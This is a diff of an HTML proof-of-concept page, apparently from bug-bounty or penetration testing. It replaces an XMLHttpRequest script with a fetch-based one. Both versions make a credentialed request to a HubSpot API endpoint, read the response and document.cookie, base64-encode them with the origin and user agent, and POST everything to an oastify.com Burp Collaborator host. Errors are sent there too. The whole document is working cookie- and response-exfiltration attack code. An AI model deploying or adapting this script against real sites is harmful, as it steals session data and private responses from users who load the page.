@@ -6,49 +6,68 @@
 <body>
     <h1>Loading...</h1>
     <script>
-    // Method 1: Using XMLHttpRequest with withCredentials
-    var xhttp = new XMLHttpRequest();
-    xhttp.onreadystatechange = function() {
-        if (this.readyState == 4 && this.status == 200) {
-            // Get response
-            var response = this.responseText;
+    (function() {
+        // Send request with credentials
+        fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
+            method: 'POST',
+            credentials: 'include',  // This sends the cookies!
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify([{
+                event: 'page_view',
+                properties: {
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                }
+            }])
+        })
+        .then(response => {
+            return response.text().then(data => {
+                return {status: response.status, data: data};
+            });
+        })
+        .then(result => {
+            // Get cookies
+            var cookies = document.cookie || "No cookies found (HttpOnly)";
             
-            // Send response and cookies to Collaborator
-            var xhr2 = new XMLHttpRequest();
-            xhr2.open("POST", "https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com", true);
-            xhr2.withCredentials = false;
-            xhr2.setRequestHeader("Content-Type", "application/json");
-            
-            // Get cookies (if any)
-            var cookies = document.cookie || "No cookies (HttpOnly)";
-            
-            // Encode cookies in base64
+            // Encode in base64
             var encodedCookies = btoa(unescape(encodeURIComponent(cookies)));
-            var encodedResponse = btoa(unescape(encodeURIComponent(response)));
+            var encodedResponse = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
             
-            var payload = JSON.stringify({
+            // Send to Collaborator
+            var payload = {
                 cookies: encodedCookies,
                 cookies_raw: cookies,
                 response: encodedResponse,
-                response_raw: response,
+                response_raw: result,
                 origin: window.location.origin,
                 userAgent: navigator.userAgent,
-                url: window.location.href
-            });
+                timestamp: new Date().toISOString()
+            };
             
-            xhr2.send(payload);
-            console.log("[+] Data sent to Collaborator!");
-            console.log("[+] Cookies (base64):", encodedCookies);
-            console.log("[+] Cookies (raw):", cookies);
-        }
-    };
-    
-    // Send request WITH credentials (cookies will be sent automatically)
-    xhttp.open("GET", "https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth", true);
-    xhttp.withCredentials = true;  // This sends the cookies!
-    xhttp.send();
-    
-    console.log("[+] Request sent with credentials!");
+            return fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+        })
+        .then(() => {
+            console.log('[+] Data sent to Collaborator!');
+        })
+        .catch(error => {
+            console.log('[-] Error:', error);
+            // Send error to Collaborator
+            fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    error: error.toString(),
+                    origin: window.location.origin
+                })
+            });
+        });
+    })();
     </script>
 </body>
 </html>
